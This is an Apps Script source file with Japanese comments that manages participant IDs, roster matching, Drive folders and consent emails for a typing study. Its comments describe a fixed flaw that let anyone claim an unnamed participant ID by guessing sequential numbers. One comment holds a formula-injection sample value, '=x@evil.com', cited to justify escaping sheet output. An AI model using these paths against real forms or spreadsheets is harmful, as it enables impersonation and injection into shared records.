 *     評価していたので、⚠️ **その行のメールが別人でも素通り**していた。
 *
 *   ⚠️★★★ **なぜ G1 の穴が O1 のデータを壊すのか。**
 *     ★ 採番元の Phase1 ロスターは **Phase1 / G1 / O1 の共用**である
 *       （`docs/o1-deletion-ledger.md:179`）。
 *     → ⚠️ G1 経由で名乗った ID が、**O1 の数週間ぶんの常時打鍵ログと同じ P-ID 空間に混ざる**。
 *     → A さんから削除要求が来たとき `<pid>_o1day*` の削除は
 *       「**B のデータも消す**」か「**A のを消し残す**」のどちらかになり、
 *       ⚠️ 同意文書 §4-3 の「消えます」が**履行不能**になる。
 *
 * ★ したがって照合の順序を変えた（O1 と同一）:
 *   1. **メール一致を最優先**する（★ 受付メールを送る先と同じ = 自己整合的）
 *   2. メールで見つからないときだけ、申告された P-ID を見る
 *      - ★ その行のメールが**空**なら採用する（氏名だけ先に入れた行を埋める正当な経路）
 *      - ⚠️ **別のメールが入っていたら `conflict`** —— 発番も送信もせず、研究者に判断させる
 */
function g1FindInPhase1Roster_(sheet, opts) {
  var last = sheet.getLastRow();
  if (last < 1) return null;
  var rows = sheet.getRange(1, 1, last, 3).getValues(); // P-ID / 氏名 / メール
  var email = opts.email ? String(opts.email).trim().toLowerCase() : "";
  var pid = opts.pid ? String(opts.pid).trim().toUpperCase() : "";
  var i, rowPid, rowEmail;

  // 1. ★ メール一致（★ 最も強い手がかり。本人の受信箱と一致する）
  if (email) {
    for (i = 0; i < rows.length; i++) {
      rowEmail = String(rows[i][2]).trim().toLowerCase();
      if (rowEmail && rowEmail === email) {
        rowPid = String(rows[i][0]).trim().toUpperCase();
        // ⚠️★★ **A 列の値をそのまま P-ID として返さない。**
        //   ★ 空なら後段が採番して埋める（正当な経路）。
        //   ⚠️ 空でないのに `P<数字>` でないなら、見出し行・手入力ミス・別の記法である。
        //     → ★ その値で受付メールを送ると、被験者は**存在しない ID** を信じて入力する。
        if (rowPid && !g1IsValidPid_(rowPid)) {
          return { conflict: true, pid: rowPid, row: i + 1, reason: "invalid-pid-in-roster" };
        }
        return { pid: rowPid, row: i + 1 };
      }
    }
  }

  // 2. ★ 申告された P-ID（⚠️ 検証つき）
  if (pid) {
    for (i = 0; i < rows.length; i++) {
      rowPid = String(rows[i][0]).trim().toUpperCase();
      if (rowPid !== pid) continue;
      rowEmail = String(rows[i][2]).trim().toLowerCase();
      if (!rowEmail) {
        // ⚠️★★★ **メールが空なだけでは採用しない**（security-checker 指摘 HIGH-1・2026-09-01）。
        //
        //   ★ 実測された乗っ取り経路: `assignG1ParticipantId()` は `appendRow([newPid])` で
        //     **氏名もメールも空の行**を作る（★ ログ自身が「氏名・メールは手入力」と言っている）。
        //     ⚠️ 研究者が手入力するまでの間、その P-ID を申告した**誰でも**この分岐を通り、
        //     その ID を受け取り、**自分のメールがその行に書き込まれ**、受付メールが届く。
        //   ⚠️ P-ID は連番 3 桁・フォーム URL は配布済み・`setCollectEmail(false)` なので
        //     Google 認証も無い → ★ **総当たりで 20 個も試せば当たる**。
        //
        // ★ そこで **氏名が入っている行だけ**採用する:
        //   - 研究者が「氏名を先に入れた行」を埋めるのは**正当な経路**なので通す
        //   - ⚠️ 裸の行（氏名も空）は **conflict** にして研究者に判断させる
        //   ★ 安全側に倒れる: 誤って止めても研究者が確認して再提出してもらえばよい。
        //
        // ⚠️★★ **O1 も同じ穴を持つ**（`Form_O1/GSE_O1_Form_Builder.gs:1022`）。
        //   ★ 別 PR で同じ修正を入れること（`.steering/…/tasklist.md` に起票済み）。
        var rowName = String(rows[i][1] == null ? "" : rows[i][1]).trim();
        if (!rowName) {
          return { conflict: true, pid: rowPid, row: i + 1, reason: "bare-row-claim" };
        }
        return { pid: rowPid, row: i + 1 }; // ★ 氏名がある = 研究者が用意した行
      }
      // ⚠️★★★ 別人のメールが入っている行を名乗っている。
      return { conflict: true, pid: rowPid, row: i + 1, reason: "email-mismatch" };
    }
  }

  return null;
}

// G1 実施トラッキングに P-ID の行が無ければ作る。備考セル（失敗の可視化先）を返す。
function g1EnsureRunRow_(pid) {
  var props = PropertiesService.getScriptProperties();
  var ssId = props.getProperty(MGMT_SHEET_PROP_G1);
  if (!ssId) {
    Logger.log("⚠️ G1 管理シートが未作成なのでトラッキング行は作れません（buildManagementSheet() を実行）");
    return null;
  }
  var sh = SpreadsheetApp.openById(ssId).getSheetByName("G1 実施トラッキング");
  if (!sh) return null;
  // ★ ヘッダがずれていると「備考」が別の列（見出しの無い列）に書かれ、
  //   送信失敗のフラグを研究者が**見つけられなくなる**。ずれていたら行を作らず記録に残す。
  //   ⚠️ ここで throw すると onG1ConsentSubmit の採番まで巻き戻るので、null を返して続行させる
  //      （P-ID の発番と受付メールのほうが優先度が高い）。
  try {
    assertRunHeader_(sh);
  } catch (headerErr) {
    Logger.log("❌ トラッキング行を作れません（ヘッダ不一致・setupG1Forms を再実行）: " + headerErr);
    return null;
  }

  var colPid = runCol_("P-ID");
  var colNote = runCol_("備考");
  var last = sh.getLastRow();
  for (var r = 3; r <= last; r++) {
    if (String(sh.getRange(r, colPid).getValue()).trim().toUpperCase() === pid) {
      return sh.getRange(r, colNote); // 既にある（再登録）
    }
  }
  var row = Math.max(last + 1, 3);
  sh.getRange(row, colPid).setValue(pid);
  return sh.getRange(row, colNote);
}

/**
 * ⚠️★★★ **ロスターの取り違え / 二重採番を、研究者が普段見るシートに出す。**
 *
 * ★ なぜ Logger だけにしないか: O1 は `Logger.log` で止めているが、
 *   ⚠️ **研究者が Apps Script の実行ログを見に行くまで誰も気づかない**。
 *   ★ 「警告が出ていない」を「問題が無い」と読ませないために、シートへ出す
 *   (memory `silent-success-is-not-visible` / 研究者判断 2026-09-01)。
 *
 * ⚠️★★ **申告された P-ID の行には書かない。**
 *   ★ conflict のとき `pid` は**他人のもの**なので、その人のトラッキング行に書くと
 *     ⚠️ **無関係な被験者の記録を汚す**。→ 専用の行に積む。
 *
 * ⚠️★★★ **その専用行の P-ID 列は「空」にする。** ★ 当初 `⚠要確認` という印を入れたが、
 *   実際に消費者を grep したところ **`submissionPids_`（:1069・「行の真実源」）が
 *   `if (pid && ...)` で拾ってしまい、⚠️ 存在しない参加者を 1 人として数える**ことが分かった。
 *   ★ P-ID 列を空にすれば、`submissionPids_` も `refreshG1RunSheet`(:3406) も
 *   `g1CollectPendingMaterials_`(:3091) も `if (!pid) continue` 相当で**自然に除外する**。
 *   → ⚠️ 印は備考の文頭 `⚠★要確認` が担う（★ 人には見え、機械は数えない）。
 *
 * ⚠️ 実名・メールアドレスは**書かない**（`data-privacy`）。マスクした形だけ残す。
 *
 * @param {{pid: string, row: number, reason: string}} found
 * @param {string} email ★ 提出者のメール（⚠️ マスクして書く）
 * @param {string} outcome ⚠️★★★ **実際に何をしたか**を書く文字列。
 *   ★ 固定文にしてはいけない —— 初版は常に「発番も受付メールもしていません」と書いていたが、
 *   ⚠️ 重複検知の経路では**発番済み**だったので、**研究者の見るシートに嘘が載っていた**
 *   (code-reviewer 指摘 H3・2026-09-01)。★ 「警告が無い＝安全」の裏返しで、
 *   **虚偽の安心**が最も避けたい形である。
 */
function g1RecordRosterConflict_(found, email, outcome) {
  try {
    var props = PropertiesService.getScriptProperties();
    var ssId = props.getProperty(MGMT_SHEET_PROP_G1);
    if (!ssId) {
      Logger.log("⚠️ G1 管理シートが未作成なので conflict をシートに出せません（Logger のみ）");
      return false;
    }
    var sh = SpreadsheetApp.openById(ssId).getSheetByName("G1 実施トラッキング");
    if (!sh) {
      Logger.log("⚠️ 「G1 実施トラッキング」タブが無いので conflict をシートに出せません（Logger のみ）");
      return false;
    }
    try {
      assertRunHeader_(sh);
    } catch (headerErr) {
      Logger.log("❌ ヘッダ不一致のため conflict をシートに出せません（Logger のみ）: " + headerErr);
      return false;
    }
    var colNote = runCol_("備考");
    var row = Math.max(sh.getLastRow() + 1, 3);
    // ⚠️★★★ **P-ID 列は空のままにする**（上の注記を参照）。
    //   ★ ここに何か書くと `submissionPids_` が参加者として数える。
    // ⚠️★★ **ここも `g1PlainText_` で包む。** 現状この文字列は `⚠★要確認` で始まるので
    //   数式にはならないが、★ **それは連結順のおかげ**にすぎない。
    //   ⚠️ 実測: `g1MaskEmail_("=x@evil.com")` は **`=***@evil.com`** を返す ——
    //   つまり材料の中に数式の起点が混ざりうる。★ 誰かが文言を並べ替えた瞬間に
    //   **黙って数式になる**。→ 安全を並び順に依存させない。
    sh.getRange(row, colNote).setValue(
      g1PlainText_(
      "⚠★要確認 ロスター取り違えの疑い（" + (found.reason || "conflict") + "）: " +
        "申告ID=" + found.pid + " / ロスター行=" + (found.row || "-") +
        " / 提出者=" + g1MaskEmail_(email) +
        " ★ " + (outcome || "★ 何をしたかが記録されていません（⚠️ 呼び出し側の不備）") +
        " 研究者が確認してください。"
      )
    );
    SpreadsheetApp.flush();
    Logger.log("📝 conflict を「G1 実施トラッキング」の " + row + " 行目（P-ID 列は空・備考に ⚠★要確認）に記録しました");
    return true;
  } catch (err) {
    // ⚠️ ここで throw すると発番の巻き戻しに見えるので握るが、★ 黙らせない。
    Logger.log("❌ conflict をシートに記録できませんでした（★ Logger には残っています）: " + err);
    return false;
  }
}

/**
 * ★★ その被験者の課題ページフォルダを **名前で** 探す（2026-08-07）。
 *
 * ⚠️★★ **なぜ登録時にリンクを載せられるようになったのか。**
 *   従来「登録時点では割付が無いので送れない」としていた。これは**手順の前提**であって
 *   原理的な制約ではない。★ P-ID は `既存の最大値 + 1` で決まる（`g1NextParticipantId_`）ので
 *   **次に出る番号は予測できる**。研究者が募集前に
 *       `./prepare-subjects.sh --range <開始 P-ID> <終了 P-ID>` → Drive へドラッグ → 1 つずつ共有
 *       （★ 範囲は `checkMaterialsProvisioning()` がロスターから作って出す。ここに書かない）
 *   まで済ませておけば、登録時にはフォルダが**既に存在する**。
 *   ⚠️★ さらに G1 は**過去の参加者が主**なので、予測ではなく **ロスターに載っている ID**
 *     を用意しておくのが本筋である（`checkMaterialsProvisioning` はそちらを見る）。
 *   ⚠️ ★ 割付は従来どおり研究者の明示的な行為のままである（`§3-1` に触れない）。
 *   ★ GAS がやるのは「名前で探して、妥当なら URL を返す」だけで、**何も作らない**。
 *
 * ⚠️ 見つからなければ "" を返す。★ その場合は 2 便の従来経路に落ちる（壊れない）。
 *
 * @return {{url: string, problem: string}} url が空なら problem に理由が入る
 */
// ★★ 被験者別フォルダとして**認める名前**（★ ここが単一の真実源）。
//   ⚠️ 探す側 (`g1MaterialsUrlForPid_`) と検査する側 (`g1MaterialsFolderProblem_`) の**両方**が
//   ここを読む。片方だけ直すと「探せたのにガードで弾かれる」という原因の分かりにくい失敗になる。
//
// ⚠️★ 2026-08-07: 実運用のフォルダ名が `G1課題文_P006` 形式だったので接頭辞つきを認めた。
//   ★ 接頭辞は Drive の画面で何のフォルダか分かるようにするためのもので、
//     `preregistration.md §2.12` が伏せる項目（題材・課題の型・条件名）を 1 つも含まない。
//   ⚠️ **前方一致にしない。** 完全一致を 2 通り認めるだけである
//     （前方一致だと「P01」が「P010」を、「G1課題文_P006_旧」が P006 を掴む）。
var G1_MATERIALS_FOLDER_PREFIX = "G1課題文_";

function g1MaterialsFolderNames_(pid) {
  var p = String(pid == null ? "" : pid).trim();
  // ⚠️★ 空や不正な ID で Drive を探しに行かない（`getFoldersByName("")` は
  //   何を返すか保証が無いうえ、無意味な問い合わせを 2 回投げる）。★ 空配列を返し、
  //   呼び出し側 (`g1MaterialsUrlForPid_`) が「形が違う」と言い切れるようにする。
  if (!p) return [];
  return [p, G1_MATERIALS_FOLDER_PREFIX + p];
}

function g1MaterialsUrlForPid_(pid) {
  if (!G1_MATERIALS_PARENT_ID) return { url: "", problem: "G1_MATERIALS_PARENT_ID が未設定" };
  var parent;
  try {
    parent = DriveApp.getFolderById(G1_MATERIALS_PARENT_ID);
  } catch (e) {
    return { url: "", problem: "課題ページの親フォルダを開けません: " + e };
  }
  // ⚠️★ 認めるフォルダ名は **この 2 つだけ**（2026-08-07・実運用の名前に合わせた）。
  //   ★ 部分一致・前方一致にしてはならない。「P01」で「P010」を掴む、
  //     「G1課題文_P006_旧」を掴む、といった取り違えが起きる。★ 完全一致を 2 通り認めるだけである。
  //   ⚠️ 名前の検査はここだけでなく `g1MaterialsFolderProblem_`（ガード 7）にもある。
  //     ★ **両方を同じ関数 `g1MaterialsFolderNames_` から作る**。片方だけ直すと、
  //     「探せたのにガードで弾かれる」という原因の分かりにくい失敗になる。
  var names = g1MaterialsFolderNames_(pid);
  if (names.length === 0) {
    return { url: "", problem: "P-ID が空です（★ 呼び出し側の不具合）" };
  }
  // ⚠️★★ **探す側は大文字小文字に厳格、ガード 7 は大小を吸収する**（意図的な非対称）。
  //   ★ 探す側 (`getFoldersByName`) を緩められないのは、Drive API が完全一致でしか引けず、
  //     大小違いを許すには**親の全フォルダを列挙する**しかないためである（人数ぶん重くなる）。
  //   ★ ガード 7 が緩いのは、そちらは **人が貼った URL** を検査する経路だからである
  //     （URL は既にフォルダを名指ししているので、大小の揺れで弾く必要が無い）。
  //   ⚠️ 帰結: `g1課題文_p015` のような名前は **ガードは通るが自動では見つからない**。
  //     → 自動で 1 通にしたければフォルダ名は `g1MaterialsFolderNames_` の形そのままにすること。
  var hits = [];
  try {
    for (var n = 0; n < names.length; n++) {
      var it = parent.getFoldersByName(names[n]);
      while (it.hasNext()) hits.push(it.next());
    }
  } catch (e2) {
    return { url: "", problem: "フォルダを探せません: " + e2 };
  }
  if (hits.length === 0) {
    return {
      url: "",
      problem:
        "この P-ID のフォルダがまだありません（★ 先に用意しておけば 1 通で送れます。" +
        "探した名前: " + names.join(" / ") + "）",
    };
  }
  if (hits.length > 1) {
    // ⚠️ ★ 候補が 2 つ以上 = どちらが正しいか機械には決められない。**送らない**。
    //   ★ 名前を 2 通り認めたことで「P006 と G1課題文_P006 が両方ある」もここで止まる。
    return { url: "", problem: "同じ被験者のフォルダが 2 つ以上あります（★ 人が片付けてください）" };
  }
  var folder = hits[0];
  var url = "https://drive.google.com/drive/folders/" + folder.getId();
  // ★ 既存のガード 7 をそのまま通す（共有し忘れ・置き場所違いをここでも捕まえる）
  var problem = g1MaterialsFolderProblem_(url, pid);
  if (problem) return { url: "", problem: problem };
  return { url: url, problem: "" };
}

/**
 * ★ ロスターに**実在する** P-ID を昇順で返す（重複は畳む）。
 *
 * ⚠️★ `g1NextParticipantId_` は最大値しか見ないので、**過去参加者が誰なのか**は分からない。
 *   G1 の被験者は「過去の参加者」が主である（研究者判断 2026-08-07）＝ `onG1ConsentSubmit` は
 *   採番せず既存 ID を再利用する（`g1FindInPhase1Roster_` がメールで引く）ので、
 *   ★ **用意しておくべき P-ID はロスターに載っている全員**である。
 *
 * ⚠️ 1 行目はヘッダである。`g1NextParticipantId_` と同じく `^P\d+$` に一致する行だけを拾うので、
 *   ヘッダ（「参加者ID」など）は自然に外れる。
 */
function g1RosterParticipantIds_(sheet) {
  var last = sheet.getLastRow();
  if (last < 1) return [];
  var values = sheet.getRange(1, 1, last, 1).getValues();
  var seen = {};
  var out = [];
  for (var i = 0; i < values.length; i++) {
    var s = String(values[i][0]).trim();
    if (!/^P\d+$/.test(s)) continue;
    if (seen[s]) continue;
    seen[s] = true;
    out.push(s);
  }
  out.sort(function (a, b) {
    return parseInt(a.slice(1), 10) - parseInt(b.slice(1), 10);
  });
  return out;
}

/**
 * ★ 募集を始める前に、課題ページのフォルダが用意できているかを見る（読むだけ・何も作らない）。
 *
 * ⚠️★★ **2026-08-07 に見る範囲を変えた。**
 *   旧版は「次に発番される P-ID から 5 人」しか見なかった。⚠️ これは
 *   **新規参加者しか来ない**という前提であり、G1 の実際の運用（過去参加者が主・既存 ID を再利用）
 *   と食い違う。★ その前提のままだと、**再参加者のフォルダが 1 つも無くても緑に見える**。
 *   → ロスターに実在する全 P-ID（＝再利用されうる ID）＋ 次に発番される数人、を見る。
 *
 * @param {number=} lookahead 次に発番される分を何人ぶん見るか（既定 3）
 */
function checkMaterialsProvisioning(lookahead) {
  if (!PHASE1_MGMT_SHEET_ID) {
    Logger.log("❌ PHASE1_MGMT_SHEET_ID が未設定です。");
    return;
  }
  var roster = SpreadsheetApp.openById(PHASE1_MGMT_SHEET_ID).getSheetByName("参加者ロスター");
  if (!roster) {
    Logger.log("❌ 「参加者ロスター」タブがありません。");
    return;
  }
  var ahead = lookahead === undefined || lookahead === null ? 3 : parseInt(lookahead, 10);
  if (!(ahead >= 0)) ahead = 3;

  var existing = g1RosterParticipantIds_(roster);

  // ⚠️★ ロスターに**非正準な P-ID**（`P1` のようなゼロ埋めなし）があると、
  //   ★ ここは `P1` を探しに行くが、Drive のフォルダは `P001` なので**永久に見つからない**。
  //   （`g1RosterParticipantIds_` / `g1NextParticipantId_` は `^P\d+$` で拾う仕様なので、
  //     ここで弾かず**名指しで警告する**。⚠️ 黙って `P1→P001` に直すと入力ミスを隠す。）
  var nonCanonical = existing.filter(function (p) {
    return !/^P\d{3}$/.test(p);
  });

  // ⚠️★ 1 人あたり Drive を **約 6 回**叩く（親を開く / 名前で 2 通り探す /
  //   ガード 7 で開く・親を辿る・共有設定を読む）。Apps Script の実行は 6 分で切られる。
  //   ★ 実測 (2026-08-07・GSE_Gate1 の実行ログ): 12 人で 16 秒 = **約 1.3 秒/人**。
  //     → 40 人で約 55 秒。6 分に対して余裕がある。
  //   ⚠️ それでも上限を置くのは、人数が想定外に増えたときに**黙って途中で死ぬ**のを防ぐため。
  //   → ★ **切ったことを必ず言う**（無言の打ち切りは「全部見た」と読まれる）。
  var LIMIT = 40;
  var truncated = 0;
  if (existing.length > LIMIT) {
    truncated = existing.length - LIMIT;
    // ⚠️★★ 落とすのは**番号の小さい方**である（review 指摘）。
    //   ★ G1 は「過去参加者が主」＝ **直近の参加者ほど再登録しやすい**。
    //   昇順の先頭を残すと、いちばん確かめたい層が未検査になり、目的に対して向きが逆になる。
    existing = existing.slice(existing.length - LIMIT);
  }
  var next = g1NextParticipantId_(roster);
  var n = parseInt(String(next).replace(/^P/, ""), 10);
  var future = [];
  for (var i = 0; i < ahead; i++) {
    future.push("P" + ("000" + (n + i)).slice(-3));
  }

  Logger.log("★ ロスターに実在する P-ID: " + (existing.length ? existing.join(" ") : "（なし）"));
  if (truncated > 0) {
    Logger.log(
      "⚠️★ 実行時間の上限があるため **直近 " + LIMIT + " 人**だけを見ています（古い " + truncated +
        " 人は未検査）。★ この結果を「全員そろっている」と読まないこと。"
    );
  }
  if (nonCanonical.length > 0) {
    Logger.log(
      "⚠️★ ロスターに 3 桁ゼロ埋めでない P-ID があります: " + nonCanonical.join(" ") +
        "\n   ★ Drive のフォルダは P001 形式なので、この行は**永久に「まだありません」**になります。" +
        "\n   ⚠️ 直すのはロスター側です（機械で正規化すると入力ミスを隠すため、ここでは直しません）。"
    );
  }
  Logger.log("★ 次に発番される P-ID: " + next + "（先読み " + ahead + " 人）");
  Logger.log("--------");

  // ⚠️ ★ 2 群を分けて数える。「再参加者ぶんが揃っているか」と「新規ぶんの余裕があるか」は
  //   運用上まったく別の話であり、合算すると**どちらが欠けているのか分からなくなる**。
  var missingExisting = [];
  var missingFuture = [];
  function check(pid, into, label) {
    var found = g1MaterialsUrlForPid_(pid);
    if (found.url) {
      Logger.log("✅ " + pid + " (" + label + "): 用意できています");
    } else {
      into.push(pid);
      Logger.log("⚠️ " + pid + " (" + label + "): " + found.problem);
    }
  }
  for (var a = 0; a < existing.length; a++) check(existing[a], missingExisting, "既存");
  for (var b = 0; b < future.length; b++) check(future[b], missingFuture, "新規");

  Logger.log("--------");
  if (existing.length === 0) {
    Logger.log("⚠️ ロスターに P-ID が 1 つもありません（★ 管理シートを取り違えていないか確認）。");
  } else if (missingExisting.length === 0) {
    // ⚠️ 打ち切っているときに「全員」と言わない（★ 見ていない人がいる）
    Logger.log(
      truncated > 0
        ? "✅ 見た " + existing.length + " 人ぶんは **受付メール 1 通**で渡せます（⚠️ 残り " +
            truncated + " 人は未検査）。"
        : "✅ 既存 " + existing.length + " 人ぶんは全員 **受付メール 1 通**で渡せます。"
    );
  } else {
    // ⚠️★ 分母は「見た人数」であって「ロスターの人数」ではない。★ 打ち切っているときに
    //   分母だけ出すと **ロスター全体の話に読める**（警告は遠く離れた行にある・review 指摘）。
    //   → 同じ行で「未検査 X 人を含まない」と言い切る。
    Logger.log(
      "⚠️★ 既存参加者 " + missingExisting.length + " / " + existing.length +
        " 人ぶんが未用意: " + missingExisting.join(" ") +
        (truncated > 0 ? "（★ 分母は**見た " + existing.length + " 人**。未検査 " + truncated + " 人は含みません）" : "")
    );
    Logger.log("   ⚠️ 過去の参加者が再登録すると、この人たちは課題ページを**別便**まで待つことになります。");
  }
  if (ahead > 0) {
    var readyFuture = future.length - missingFuture.length;
    Logger.log(
      readyFuture > 0
        ? "★ 新規は先頭 " + readyFuture + " 人ぶん用意できています。"
        : "⚠️ いま**新規**の登録が来ると、課題ページは別便になります（2 便運用）。"
    );
  }
  // ⚠️★ 範囲をハードコードしない。★ 案内に書いた範囲と実運用の範囲がずれると、
  //   「言われたとおり打ったのに足りない」が起きる（2026-08-07 に実機ログで P001-P015 の
  //   古い案内が残っているのを見つけた。実際の範囲は P006-P020 だった）。
  //   → **いま見た P-ID から範囲を作って出す**（＝ ロスターが動けば案内も動く）。
  //
  // ⚠️★★ ただし `--range` は **連続かつ 3 桁ゼロ埋め**を前提にしている
  //   (`prepare-subjects.sh` は `^P[0-9]{3}$` を要求し、範囲は 50 人までで切る)。
  //   ★ 飛び番（P006 と P900）や非正準（P6）だと「言われたとおり打ったのに動かない」になり、
  //     ⚠️ **今回直したのと同じ種類の不具合**を案内側で作ることになる。
  //   → 範囲で書けないときは **ID を並べる形**で出す。
  var span = existing.concat(future).filter(function (p) {
    return /^P\d{3}$/.test(p);
  });
  if (span.length === 0) {
    Logger.log("★ 用意の手順: ./prepare-subjects.sh --range <開始 P-ID> <終了 P-ID> → Drive へドラッグ → 1 つずつ共有");
  } else {
    var lo = parseInt(span[0].slice(1), 10);
    var hi = parseInt(span[span.length - 1].slice(1), 10);
    var contiguous = hi - lo + 1 === span.length && span.length <= 50;
    Logger.log(
      contiguous
        ? "★ 用意の手順: ./prepare-subjects.sh --range " + span[0] + " " + span[span.length - 1] +
            " → Drive へドラッグ → 1 つずつ共有"
        : "★ 用意の手順: ./prepare-subjects.sh " + span.join(" ") +
            " → Drive へドラッグ → 1 つずつ共有\n" +
            "   ⚠️ 飛び番があるので --range ではなく ID を並べる形にしています。"
    );
  }
  Logger.log("   ★ フォルダ名は " + g1MaterialsFolderNames_("P0NN").join(" / ") + " のどちらか。");
  Logger.log("   ⚠️ 共有は**フォルダ 1 つずつ**。親を共有にして継承させないこと（全被験者分が見えます）。");
}

function g1RegisterAckSubject_() {
  return "【受付】キーボードの打ち方に関する研究 — 参加登録を承りました";
}

// ============================================================
// ★★ フォームの導線（2026-08-08 新設・この不具合が今回の最優先事項だった）
// ============================================================
// ⚠️★★ **2026-08-08 の実測**: 受付メール・`README_先に読む.txt`・`blockNN.html` の
//   どれにも G1-M / G1-S のリンクが **1 つも無かった**。
//   `protocol.md:711` の「G1-M / G1-S の回答 URL」は**研究者の持ち物リスト**（来所前提）で、
//   `protocol.md §3.1` は「操作チェックは §3 の**用紙**へ」＝ **紙が既定**である。
//   → ★ 第 13 版の在宅実施では紙が使えず、**被験者は 10 ブロック完走しても
//     G1-M に 7 回とも答えられない**（実証: P009 の「G1-M 回答数(/7)」= 0）。
//     `§2.6` の操作チェックが**データ 0 件**になる。
//
// ★ 研究者判断（2026-08-08）: **受付メール 1 通に全部入れる。**
// ⚠️ ★ **リンクを貼るだけでは足りない。** 3 つのフォームの**関係**（どれが何で、
//   いつ・何回・なぜ答えるのか）を書く。書かないと、被験者は (2) を「登録の再送」と
//   思って 1 回も出さないか、逆に毎ブロック (3) を出す。
//
// ⚠️ ★ **`§2.6` の設問文とタイミングは凍結である。ここは案内を足すだけ**であり、
//   設問・回数・対象ブロック（3〜9）を変えていない。
// ⚠️ ★ 開示範囲（`§2.12`）も守る: 題材名・課題の型・条件名・提示順・「摩擦」を書かない。
function g1FormRoutingBlock_(pid) {
  // ⚠️ ★ 短縮が無ければ生の URL に落ちる（`g1FormLink_` が絶対に空を返さない）。
  var mcheck = g1FormLink_("G1_MCHECK", FORM_ID_MCHECK);
  var survey = g1FormLink_("G1_SURVEY", FORM_ID_SURVEY);
  return [
    "■ ご回答いただくフォームは 3 つです（★ 役割が違うので使い分けてください）",
    "",
    "  (1) 参加登録・ご同意 … ★ **もう終わっています**",
    "      このメールが届いた時点で受け付け済みです。もう一度出す必要はありません。",
    "",
    "  (2) 作業の直後に答える 1 問 … ★ **3 回目〜9 回目の作業のあと、毎回（計 7 回）**",
    "      " + mcheck,
    "      ・参加者ID（" + pid + "）と、いま終わった作業の番号を選び、1 問だけ答えます。",
    "        ★ フォームでは番号を「ブロック番号」と呼んでいます（3 回目＝ブロック 3 です）。",
    "      ・⚠️ ★ **文章を書く画面（記入ページ）とは切り離してください。**",
    // ⚠️★ ここで「スマートフォンで開いてもよい」と書かない。**同じメールの
    //   「当日は携帯電話の電源を切ってください」と矛盾する**（participant-guide.md §5 /
    //   protocol.md §4.1-4 も電源を切る側で揃っている）。★ 別のタブに寄せる。
    "        ★ **ブラウザの別のタブ**で開いてください（protocol.md §3.1b）。",
    "        ★ 始める前に開いておくと、1 分の休憩の中で答えられます。",
    "      ・1 回の作業につき **1 回だけ**送信してください（同じ番号を 2 回送らない）。",
    "      ・★ 1 回目・2 回目・10 回目のあとは答えません（比べる相手がいないためです）。",
    "      ・★ 答えるのは 30 秒ほどです。間の休憩（1 分）の中で終わります。",
    // ⚠️ ★ 「答えないと記録が無効になる」とは書かない。**事実ではない**（§2.6 の合否は
    //    コホート全体の割合で見る）うえ、被験者への圧力になる。★ 大切さだけを伝える。
    "      ★ 打鍵の記録だけでは分からないことを伺っているので、7 回そろうと助かります。",
    "        ★ 忘れたときは、思い出した時点で答えていただければ大丈夫です。",
    "",
    "  (3) 終了後アンケート … ★ **10 回すべてが終わったあとに 1 回だけ**",
    "      " + survey,
    "      ・5 分ほどです。★ 正解はありません。答えたくない設問は飛ばして構いません。",
    "      ・★ これで終わりです。ご協力ありがとうございます。",
    "",
    "    ※ (2) と (3) は同じリンクを何度でも開けます。当日すぐ出せるよう、",
    "      ★ **このメールを開いたままにするか、ブックマークしておいてください。**",
    "",
  ];
}

// ★ 受付メール。⚠️ preregistration.md §2.12 の開示範囲を守る:
//   題材（分野）・課題の型・難易度の示唆・条件名を **書かない**。
//   （課題文は当日その場で画面提示する = §2.13。事前に教える必要が無い。）
function g1RegisterAckBody_(pid, materialsUrl) {
  // ★★ 課題ページのフォルダが**もう用意できていれば**、この 1 通で全部渡す（2026-08-07）。
  //    ⚠️ 用意できていなければ「別便で送る」と書く（従来の 2 便運用に落ちる）。
  //    ★ どちらの場合も §2.12 は守る: 本文に**題材名・課題の型・条件名・提示順を書かない**。
  //      書くのはリンクだけで、中身はリンク先にある。
  var hasMaterials = !!materialsUrl;
  // ★★ 2026-08-08: 短縮があれば短縮を出す（無ければ生の URL）。
  //   ⚠️ ★ 短縮は `shortenG1DistributionUrls()` で**事前に**作る。ここでは引くだけである
  //      （送信時に外部 API を叩くと、遅延と失敗が登録経路に乗るため）。
  var materialsLink = g1ShortOr_(g1MaterialsShortKey_(pid), materialsUrl);
  var materialsBlock = hasMaterials
    ? [
        "■ あなた専用の課題ページ（★ アプリと同じフォルダに入れてください）",
        "    " + materialsLink,
        "    1. このリンクを開き、block01.html … を **すべて** 保存します",
        // ⚠️★ 2026-08-08 訂正: 「アプリのフォルダ」は **展開して初めてできる**。
        //   展開前は zip ファイルしかないので、指す先が無い案内になっていた。
        "    2. ★ 上で**展開してできた**「G1_実施用_…」フォルダの中へ、**まとめて移してください**",
        "    ⚠️ ★ **あなた専用です。** 他の方とは中身が違うので、共有しないでください。",
        // ★★ 2026-08-08 改訂（preregistration.md §2.12 第 11 版）:
        //    「事前に読む」という案内をやめた。★ 課題は**当日その場で取り掛かる**ものである。
        //    ⚠️ 旧文は同じ段落で「目を通して構いません」と「開いて始めないでください」を
        //       並べており、被験者から見て**どうすればよいか決まらなかった**。
        //    ★ ページ側にゲートを入れたので、**開くだけでは何も始まらない**と言い切れる。
        "    ★ ページは**当日その場で開いて取り掛かって**いただきます。事前の準備は要りません。",
        "      ⚠️ **準備の量で評価することはありません。**",
        "    ★ 開いただけでは何も始まりません。ページの「課題を表示して始める」を押すと、",
        "      課題が表示され、そこから時間を計ります。★ **当日まで押さないでください。**",
        "",
      ]
    : [
        "■ 課題の内容について",
        "    ★ 当日お使いいただくページは、**別便のメールでお送りします**。",
        "      ★ 当日その場で開いて取り掛かっていただくものです。事前の準備は要りません。",
        "      ⚠️ **準備の量で評価することはありません。**",
        "",
      ];
  return [
    "ご登録ありがとうございます。参加登録を承りました。",
    "",
    "■ あなたの参加者ID（P-ID）",
    "    " + pid,
    "    ※ 記録はこの記号で管理します。お名前とは別に保管します。",
    "    ※ 当日までこのメールを保管してください。",
    "",
    "■ 当日の流れ（約 70 分）",
    "    ・5 分の作業を 10 回、間に 1 分の休憩をはさみます。",
    "    ・最初と最後の 1 回ずつは「書き写し」です。考える必要はありません。",
    "      これは計測器が正しく動いているか確かめるための課題で、隠していることはありません。",
    "    ・間の 8 回は、資料を読んで 300〜400 字の文章を書いていただきます。",
    "    ・途中で 7 回、「直前の回と 1 つ前の回のどちらが詰まったか」を 1 つだけ選んでいただきます。",
    "      （下の「ご回答いただくフォーム」の (2) です）",
    "    ・最後に短いアンケート（5 分ほど）にお答えいただきます。（同じく (3) です）",
    "",
